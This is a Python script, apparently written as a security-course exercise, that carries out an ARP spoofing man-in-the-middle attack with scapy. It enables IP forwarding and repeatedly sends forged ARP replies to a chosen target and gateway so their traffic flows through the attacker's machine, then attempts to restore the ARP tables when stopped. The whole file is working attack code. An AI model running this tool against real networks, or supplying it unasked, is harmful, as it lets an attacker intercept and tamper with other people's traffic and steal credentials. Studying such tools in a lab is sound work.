#!/usr/bin/env python

#this script has been created after completion the course of Z_Security

import scapy.all as scapy
import time
import subprocess
import argparse #successor of optparse


def get_arguments():
    parser=argparse.ArgumentParser()
    parser.add_argument('-t','--target',dest='target_ip',help="enter target IP")
    parser.add_argument('-g','--gateway',dest='gateway_ip',help="enter gateway IP")
    options=parser.parse_args()
    if not options.target_ip:
        parser.error('[-] enter target IP, check --help')
    elif not options.gateway_ip:
        parser.error('[-] enter gateway IP, check --help')
    return options

def get_mac(target_ip):
    #function is broadcasting ARP(address resolution protocol) to all devices in network using defalut gate
    #and taking returned info to captured_list (limited output by verbose=False)
    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request=scapy.ARP(pdst=target_ip)
    arp_req_broadcast=broadcast/arp_request # / means that forward
    
    captured_list= scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]
    captured_mac=captured_list[0][1].hwsrc
    return captured_mac

def spoof(target_ip, gateway_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet,verbose=False)

def default(target_ip, gateway_ip):
    dst_mac= get_mac(gateway_ip)
    source_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip, hwdst=dst_mac, psrc=gateway_ip,hwsrc=source_mac)
    #4 packets will be sent to be sure that landed
    scapy.send(packet,count=4,verbose=False)


#

#target_ip='10.0.2.11'
#gateway_ip='10.0.2.1'

#process

#forwarding ip
subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True)

#launching packets program
print('[+] sending packets')
sent_packets=0
try:
    options=get_arguments()
    target_ip=options.target_ip
    gateway_ip=options.gateway_ip
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packets+=2
        print('[+] Packets sent: '+ str(sent_packets),flush=True,end='\r')
        time.sleep(1)
except KeyboardInterrupt:
    print(' [-] sending packets stopped. ARP table is being reset')
    default(target_ip,gateway_ip)
    default(gateway_ip,target_ip)

        
